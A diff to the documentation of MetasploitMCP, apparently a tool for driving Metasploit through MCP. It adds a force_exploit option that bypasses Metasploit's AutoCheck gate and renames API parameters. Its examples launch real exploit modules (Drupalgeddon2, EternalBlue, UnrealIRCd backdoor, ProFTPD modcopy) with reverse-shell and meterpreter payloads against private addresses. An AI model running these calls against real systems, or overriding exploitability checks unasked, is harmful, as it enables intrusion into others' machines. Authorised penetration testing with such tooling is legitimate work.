@@ -6,6 +6,29 @@ MetasploitMCP now automatically detects when **payload options** (like `LHOST`, 
 
 ## 🔍 Problem This Solves
 
+### AutoCheck Silent Abort
+
+Metasploit modules frequently run `AutoCheck` before exploitation. For targets
+that return ambiguous responses (common for web apps), the check can be
+inconclusive and the exploit aborts with:
+
+```
+Cannot reliably check exploitability. "set ForceExploit true" to override check result.
+```
+
+MetasploitMCP now supports `force_exploit` in `run_exploit` to bypass this
+gate when you intend to execute:
+
+```python
+await run_exploit(
+    module="exploit/unix/webapp/drupal_drupalgeddon2",
+    options={"RHOSTS": "192.168.1.50", "TARGETURI": "/"},
+    payload="php/meterpreter/reverse_tcp",
+    payload_options={"LHOST": "192.168.1.10", "LPORT": 4444},
+    force_exploit=True,
+)
+```
+
 ### The Issue
 
 When running exploits with `run_as_job=True` (RPC mode), Metasploit is stricter about option validation than console mode. A common mistake is passing payload options like `LHOST` and `LPORT` as module options:
@@ -13,14 +36,14 @@ When running exploits with `run_as_job=True` (RPC mode), Metasploit is stricter 
 ```python
 # ❌ WRONG: Payload options in module options
 await run_exploit(
-    module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
+    module='exploit/unix/irc/unreal_ircd_3281_backdoor',
     options={
         'RHOSTS': '10.0.2.15',
         'RPORT': '6697',
         'LHOST': '10.0.0.1',  # ❌ This is a PAYLOAD option, not module option!
         'LPORT': 4444         # ❌ This is a PAYLOAD option, not module option!
     },
-    payload_name='cmd/unix/reverse'
+    payload='cmd/unix/reverse'
 )
 ```
 
@@ -46,15 +69,15 @@ These options belong to the PAYLOAD, not the exploit module 'exploit/unix/irc/un
 Example:
   ✗ WRONG:
     run_exploit(
-        module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
+        module='exploit/unix/irc/unreal_ircd_3281_backdoor',
         options={'RHOSTS': '...', 'LHOST': '...', 'LPORT': ...},  # ❌ LHOST/LPORT here
-        payload_name='...')
+        payload='...')
 
   ✓ CORRECT:
     run_exploit(
-        module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
+        module='exploit/unix/irc/unreal_ircd_3281_backdoor',
         options={'RHOSTS': '...', 'RPORT': ...},  # ✅ Module options only
-        payload_name='...',
+        payload='...',
         payload_options={'LHOST': '...', 'LPORT': ...})  # ✅ Payload options separate
 ```
 
@@ -98,7 +121,7 @@ If you try to set `LHOST` on the module, MetasploitMCP:
 
 ```python
 await run_exploit(
-    module_name='exploit/unix/ftp/proftpd_modcopy_exec',
+    module='exploit/unix/ftp/proftpd_modcopy_exec',
     options={
         'RHOSTS': '10.0.2.15',
         'RPORT': '80',
@@ -106,7 +129,7 @@ await run_exploit(
         'SITEPATH': '/var/www/html/',
         'TMPPATH': '/tmp'
     },
-    payload_name='cmd/unix/reverse_perl',
+    payload='cmd/unix/reverse_perl',
     payload_options={
         'LHOST': '10.0.0.1',
         'LPORT': 4444
@@ -118,12 +141,12 @@ await run_exploit(
 
 ```python
 await run_exploit(
-    module_name='exploit/windows/smb/ms17_010_eternalblue',
+    module='exploit/windows/smb/ms17_010_eternalblue',
     options={
         'RHOSTS': '192.168.1.10',
         'RPORT': 445
     },
-    payload_name='windows/x64/meterpreter/reverse_tcp',
+    payload='windows/x64/meterpreter/reverse_tcp',
     payload_options={
         'LHOST': '192.168.1.5',
         'LPORT': 4444,
